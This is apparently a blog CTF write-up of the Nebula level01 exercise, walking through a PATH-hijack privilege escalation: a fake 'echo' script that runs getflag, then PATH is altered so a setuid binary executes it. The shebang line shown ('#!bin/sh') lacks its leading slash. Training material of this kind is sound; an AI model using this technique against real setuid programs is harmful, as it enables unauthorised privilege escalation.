---
layout: post
title: "Shell meta-variable"
category: CTF, Nebula
---




>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; **[Nebula 01](http://exploit-exercises.com/nebula/level01) Agenda**: "There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?"

<center>
	<img src="/images/2015-02-01-$PATH_weakness/e8497d1e_291e1e57dd06b55bc0.jpg">
</center>

<br />

{% highlight sh linenos %}
level01@nebula:~$ /home/flag01/flag01
	and now what?

level01@nebula:~$ which sh
	/bin/sh

level01@nebula:~$ which getflag
	/bin/getflag
{% endhighlight %}

[which](http://en.wikipedia.org/wiki/Which_%28Unix%29) is a Unix command used to identify the location of executables. A [Unix shell](http://en.wikipedia.org/wiki/Unix_shell) is a command-line interpreter or shell that provides a traditional user interface for the Unix operating system. By definition on wiki, ["env"](https://en.wikipedia.org/wiki/Env) is used to either print a list of environment variables or run another utility in an altered environment without having to modify the currently existing environment

That's what we exacly need, replace [echo](http://en.wikipedia.org/wiki/Echo_%28command%29) with our own script.

{% highlight sh linenos %}
level01@nebula:~$ cat > ./echo
	#!bin/sh
	/bin/getflag;
{% endhighlight %}

At the end of input, press ["Ctrl+d"](http://unix.stackexchange.com/questions/110240/why-does-ctrl-d-eof-exit-the-shell). TLDR: just a signal saying that this is the end of a text stream. Consequently, the "*echo*" script was created in home directory. 

 - ["cat"](http://en.wikipedia.org/wiki/Cat_%28Unix%29) is a standard Unix utility that will output the contents of a specific file and can be used to concatenate and list files.
 - The [">"](http://sc.tamu.edu/help/general/unix/redirection.html) symbol means standard output redirection.
 - The dot("*.*") symbol, represents current directory (in our case, it's level01 user's home, "*/home/level01*")
 - The "*#!*" - called a [shebang](http://en.wikipedia.org/wiki/Shebang_%28Unix%29) and tells the parent shell which interpreter should be used to execute the script.

{% highlight sh linenos %}
level01@nebula:~$ chmod +x echo

level01@nebula:~$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games

level01@nebula:~$ export PATH=/home/level01/:$PATH
level01@nebula:~$ /home/flag01/flag01
{% endhighlight %}

links:

 * <a href="http://en.wikipedia.org/wiki/PATH_%28variable%29">http://en.wikipedia.org/wiki/PATH_(variable)</a>
 * [http://stackoverflow.com/questions/7328223/unix-export-command](http://stackoverflow.com/questions/7328223/unix-export-command)
